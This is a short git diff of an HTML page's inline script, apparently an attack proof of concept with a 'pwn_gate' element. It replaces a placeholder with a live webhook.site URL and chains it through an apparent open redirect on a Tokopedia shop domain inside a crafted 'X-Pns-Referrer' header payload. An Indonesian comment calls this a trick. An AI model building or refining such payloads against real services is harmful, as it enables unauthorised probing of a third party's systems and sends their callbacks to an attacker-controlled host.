@@ -9,7 +9,7 @@
 
     <script>
     const gate = document.getElementById('pwn_gate');
-    const webhook = "https://webhook.site/ID_LU_DI_SINI";
+    const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
 
     const payload = {
         source: "main_thread",
@@ -22,7 +22,8 @@
                 type: "header",
                 field: "X-Pns-Referrer",
                 // TRIK: Kita kirim URL Webhook mentah dulu
-                value: webhook 
+                value: "https://shop-id.tokopedia.com/redirect?url=" + webhook
+ 
             }]
         }]
     };
